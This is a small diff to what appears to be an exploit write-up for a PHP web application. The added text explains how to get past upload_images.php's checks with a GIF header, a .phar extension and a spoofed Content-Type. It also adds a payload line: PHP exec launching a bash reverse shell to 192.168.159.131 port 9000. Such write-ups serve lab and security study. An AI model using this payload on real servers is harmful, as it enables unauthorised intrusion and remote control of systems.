@@ -98,6 +98,9 @@ You have 3 main options to get command execution:
 There is a file upload options that do some checks on **upload_images.php**, but they are easily bypassed. This is automated in **rces.py**.
 
 You can bypass **getimagesize** by including a gif header on the payload, use **.phar** to bypass extension check and change Content-Type to image/gif to bypass **allowed_mime**.
+```
+GIF98a;<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.159.131/9000 0>&1'");?>
+```
 
 <br>
 
